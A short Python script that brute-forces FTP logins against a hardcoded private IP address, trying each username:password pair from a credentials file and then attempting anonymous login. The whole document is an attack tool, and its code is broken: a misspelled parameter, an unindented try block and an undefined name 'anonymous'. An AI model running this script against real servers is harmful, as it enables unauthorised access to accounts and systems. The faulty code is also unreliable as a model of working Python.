import ftplib

def brute_force(hostaname,passwordfile):
    passlist = open(passwordfile,"r")
    for lines in passlist.readlines():
        username = lines.split(":")[0]
        password = lines.split(":")[1].strip("\r").strip("\n")
        print("[+]Trying " + str(username) + "/" + str(password))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,password)
            print("FTP login succeeded")
            ftp.quit()
            return (username,password)
        except Exception:
            pass

def anonlogin(hostname):
    try:
    ftp = ftplib.FTP(hostname)
    ftp.login(anonymous)
    print("anonymous FTP login succeeded")
    ftp.quit()
    except Exception:
        print("login failed")


hostname = "192.168.10.78"
passwordfile = "credentials.txt"
brute_force(hostname,passwordfile)
anonlogin(hostname)